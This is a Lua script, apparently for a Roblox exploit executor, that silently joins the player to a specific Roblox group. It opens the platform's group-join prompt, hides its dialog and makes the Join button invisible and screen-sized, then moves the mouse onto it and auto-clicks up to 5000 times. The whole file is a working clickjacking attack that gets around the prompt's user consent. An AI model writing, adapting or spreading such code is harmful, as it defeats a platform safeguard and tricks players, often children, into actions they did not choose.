local success, err = pcall(function()
	local GroupService = game:GetService("GroupService")
	local Players = game:GetService("Players")
	local CoreGui = game:GetService("CoreGui")
	local GuiService = game:GetService("GuiService")
	local RunService = game:GetService("RunService")

	assert(GroupService, "GroupService missing")
	assert(Players, "Players missing")
	assert(CoreGui, "CoreGui missing")
	assert(GuiService, "GuiService missing")

	local LocalPlayer = Players.LocalPlayer
	assert(LocalPlayer, "LocalPlayer missing")

	local Group_ID = 756112917

	assert(typeof(mousemoveabs) == "function", "mousemoveabs not available")
	assert(typeof(mouse1press) == "function", "mouse1press not available")
	assert(typeof(mouse1release) == "function", "mouse1release not available")

	local inGroup = false
	pcall(function()
		inGroup = LocalPlayer:IsInGroupAsync(Group_ID)
	end)
	if inGroup then
		print("Already in group.")
		return
	end

	local RobloxGui = CoreGui:FindFirstChild("RobloxGui")
	if not RobloxGui then
		print("RobloxGui not found.")
		return
	end

	local Conn = nil
	pcall(function()
		Conn = RobloxGui.ChildAdded:Connect(function(child)
			pcall(function()
				if child and child.Name == "FocusNavigationCoreScriptsWrapper" then
					child.Visible = false
				end
			end)
		end)
	end)

	task.spawn(function()
		pcall(function()
			GroupService:PromptJoinAsync(Group_ID)
		end)
	end)

	local CoreGuiGroupObject = nil
	pcall(function()
		CoreGuiGroupObject = RobloxGui:WaitForChild("FocusNavigationCoreScriptsWrapper", 15)
	end)

	pcall(function()
		if Conn then
			Conn:Disconnect()
			Conn = nil
		end
	end)

	if not CoreGuiGroupObject or not CoreGuiGroupObject.Parent then
		print("CoreGuiGroupObject not found or already removed.")
		return
	end

	local Button = nil
	local attempts = 0

	repeat
		task.wait(0.1)
		attempts += 1
		pcall(function()
			for _, obj in pairs(CoreGuiGroupObject:GetDescendants()) do
				if obj
					and obj.Parent
					and obj:IsA("ImageButton")
					and typeof(obj.Name) == "string"
					and string.find(obj.Name, "Join")
				then
					Button = obj
					break
				end
			end
		end)
	until Button ~= nil or attempts >= 50

	if not Button or not Button.Parent then
		print("Join button not found after", attempts, "attempts.")
		return
	end

	pcall(function()
		Button.BackgroundTransparency = 1
		Button.ImageTransparency = 1
	end)

	pcall(function()
		for _, obj in pairs(Button:GetDescendants()) do
			if obj and obj:IsA("GuiObject") then
				pcall(function() obj.Visible = false end)
			end
		end
	end)

	pcall(function()
		Button.Changed:Connect(function(prop)
			pcall(function()
				if prop == "BackgroundTransparency" and Button.BackgroundTransparency ~= 1 then
					Button.BackgroundTransparency = 0.99
				end
				if prop == "ImageTransparency" and Button.ImageTransparency ~= 1 then
					Button.ImageTransparency = 0.99
				end
			end)
		end)
	end)

	task.wait(0.3)

	pcall(function()
		if Button and Button.Parent then
			Button.Parent = CoreGuiGroupObject
			Button.Size = UDim2.new(1, 500, 1, 500)
			Button.Position = UDim2.new(1, 0, 1, 0)
			Button.AnchorPoint = Vector2.new(1, 1)
		end
	end)

	pcall(function()
		local Dialog = CoreGuiGroupObject:FindFirstChild("Dialog")
		if Dialog then
			for _, v in pairs(Dialog:GetDescendants()) do
				if v and v:IsA("GuiObject") then
					pcall(function() v.Visible = false end)
				end
			end
		end
	end)

	pcall(function()
		CoreGuiGroupObject.Visible = true
	end)

	local centerX, centerY = 0, 0
	local posOk = false
	pcall(function()
		local inset = GuiService:GetGuiInset()
		local pos = Button.AbsolutePosition
		local size = Button.AbsoluteSize
		if pos and size and inset then
			centerX = pos.X + (size.X / 2)
			centerY = pos.Y + (size.Y / 2) - inset.Y
			posOk = true
		end
	end)

	if not posOk or (centerX == 0 and centerY == 0) then
		print("Could not calculate button position.")
		return
	end

	pcall(function()
		mousemoveabs(centerX, centerY)
	end)

	task.wait(0.15)

	task.spawn(function()
		local maxClicks = 5000
		local clicks = 0
		while
			clicks < maxClicks
			and CoreGuiGroupObject
			and CoreGuiGroupObject.Parent ~= nil
			and Button
			and Button.Parent ~= nil
		do
			pcall(function()
				mouse1press()
				task.wait(0.05)
				mouse1release()
			end)
			task.wait(0.1)
			clicks += 1
		end
	end)
end)

if not success then
	print("Script failed:", tostring(err))
end
